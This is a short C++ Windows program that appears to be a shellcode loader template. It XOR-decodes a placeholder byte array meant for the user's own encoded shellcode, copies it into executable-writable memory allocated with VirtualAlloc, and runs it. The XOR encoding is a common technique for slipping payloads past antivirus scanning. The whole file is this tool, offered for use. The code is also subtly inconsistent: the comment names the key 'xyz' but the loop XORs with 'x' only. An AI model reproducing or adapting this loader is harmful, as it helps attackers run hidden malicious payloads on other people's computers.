#include <windows.h> // Windows header 
#include <iostream>
int main(int argc, char** argv)
{
    char b[] = {/* your XORd with key of 'xyz' shellcode goes here*/ };
    char c[sizeof b];
    for (int i = 0; i < sizeof b; i++)
    {
        c[i] = b[i] ^ 'x';
    }
    void* exec = VirtualAlloc(0, sizeof c, MEM_COMMIT,
        PAGE_EXECUTE_READWRITE);
    memcpy(exec, c, sizeof c);
    ((void (*)())exec)();
}